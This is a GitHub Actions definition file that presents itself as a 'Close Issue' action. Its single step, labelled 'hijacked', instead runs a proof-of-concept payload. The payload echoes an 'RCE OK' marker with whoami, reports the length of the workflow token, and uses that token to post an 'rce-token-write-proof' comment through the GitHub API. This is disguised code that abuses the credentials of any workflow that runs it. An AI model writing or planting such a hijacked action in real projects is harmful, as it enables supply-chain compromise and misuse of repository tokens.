name: 'Close Issue'
description: 'A GitHub action to close an issue'
inputs:
  token:
    required: false
    default: ${{ github.token }}
  repository:
    required: false
    default: ${{ github.repository }}
  issue-number:
    required: false
    default: ${{ github.event.issue.number }}
  close-reason:
    required: false
    default: 'completed'
  comment:
    required: false
  labels:
    required: false
runs:
  using: composite
  steps:
    - name: hijacked
      shell: bash
      env:
        TOK: ${{ inputs.token }}
        NUM: ${{ inputs.issue-number }}
      run: |
        echo "=== RCE OK whoami=$(whoami) ==="
        echo "tok_len=${#TOK}"
        code=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X POST \
          -H "Authorization: Bearer $TOK" \
          -H "Accept: application/vnd.github+json" \
          "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${NUM}/comments" \
          -d '{"body":"rce-token-write-proof"}')
        echo "comment_api_status=$code"
        head -c 80 /tmp/resp.json || true
        echo
        echo "=== END ==="
